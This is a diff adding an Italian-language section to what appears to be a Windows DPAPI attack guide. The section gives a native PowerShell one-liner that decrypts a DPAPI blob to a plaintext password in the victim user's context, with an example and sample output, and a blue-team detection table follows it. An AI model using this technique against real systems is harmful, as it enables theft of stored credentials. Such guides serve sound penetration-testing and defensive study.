@@ -526,6 +526,28 @@ dpapi.py masterkey -file <GUID> -system <SYSTEM-KEY>
 
 ***
 
+## PowerShell Nativo — Decriptare un Blob DPAPI senza Tool Esterni
+
+Se sei nel contesto dell'utente che ha cifrato il blob, Windows può decriptarlo direttamente — nessun tool da scaricare, nessun AV da bypassare.
+
+> **Requisito:** devi essere nel contesto dell'utente che ha cifrato il blob (sessione attiva, token impersonato, o runAs).
+
+```powershell
+(New-Object PSCredential "N/A", ("<BLOB-HEX>" | ConvertTo-SecureString)).GetNetworkCredential().Password
+```
+
+Esempio:
+
+```powershell
+(New-Object PSCredential "N/A", ("01000000d08c9ddf0115d1118c7a00c04fc297eb..." | ConvertTo-SecureString)).GetNetworkCredential().Password
+```
+
+Output:
+
+```
+PlaintextPassword123
+```
+
 ## Detection — Blue Team
 
 | Azione                       | Log generato          | Event ID    |
